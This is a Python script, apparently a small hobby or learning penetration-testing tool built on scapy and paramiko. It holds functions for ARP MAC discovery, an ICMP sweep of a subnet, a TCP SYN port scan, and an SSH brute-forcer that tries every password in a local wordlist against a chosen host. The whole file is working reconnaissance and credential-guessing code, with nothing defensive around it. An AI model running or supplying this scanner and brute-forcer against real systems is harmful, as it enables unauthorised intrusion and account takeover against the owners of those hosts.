import paramiko
import vars
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP, Ether
from scapy.layers.l2 import ARP

def macadressscan(target):
    arppacket = ARP()
    broadcast = 'ff:ff:ff:ff:ff:ff'
    arppacket = Ether(dst=broadcast) / ARP(pdst=target, hwdst=broadcast)
    arpresponse = srp1(arppacket, timeout=0.3, verbose=False)
    if arpresponse:
        print(f'The mac adress is : {arpresponse.hwsrc} - Ip adress is :{arpresponse.psrc}')

def netmaskscan(target):
    flag = False
    while flag == False:
        if target[-1] == '.':
            break
        target = target[:-1:]
    for i in range(1, 256):
        conf.verb = 0
        ping = sr1(IP(dst=target+str(i)) / ICMP(), timeout=0.1)
        if ping:
            print(f"\n{target+str(i)}")



def checktarget(target):
    try:
        conf.verb = 0
        ping = sr1(IP(dst=target) / ICMP(), timeout=3)
        if ping:
            print("\n[*] host is Up")
            return True
        else:
            print("Host is down")
            return False

    except Exception as e:
        print(e)
        return False


def scanport(port):
    ranport = RandShort()
    conf.verb = 0
    synpkt = sr1(IP(dst=vars.target) / TCP(sport=ranport, dport=port, flags="S"), timeout=0.2)
    if not synpkt or not synpkt.haslayer(TCP):
        return False
    else:
        if synpkt[TCP].flags == 0x12:
            sr(IP(dst=vars.target) / TCP(sport=ranport, dport=port, flags='R'), timeout=0.2)
            return True
        else:
            return False


def scanallports():
    print("scaning all ports")
    for port in vars.Registered_Ports:
        status = scanport(port)
        if status:
            vars.Open_Ports.append(port)
    print("Scan Finished")


def ssh_brute_force(target):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    target_host = target
    username = input("Enter a username ")
    with open(r"C:\Users\The user\Desktop\passwd.txt") as password:
        authenticated = False
        cmd = ""

        for pass1 in password:
            pass1 = pass1.replace("\n", "")
            try:
                ssh.connect(hostname=target_host, username=username, password=pass1, timeout=1, port=22)
                print(f"[+] Login Succeed with user: {username} and password {pass1}")
                authenticated = True
                break
            except:
                print(f"{pass1} is wrong")
                continue
        ssh.close()
        if not authenticated:
            print("Passwords dont match")



while not checktarget(vars.target):
    vars.target = input(f"Please enter a new target: ")


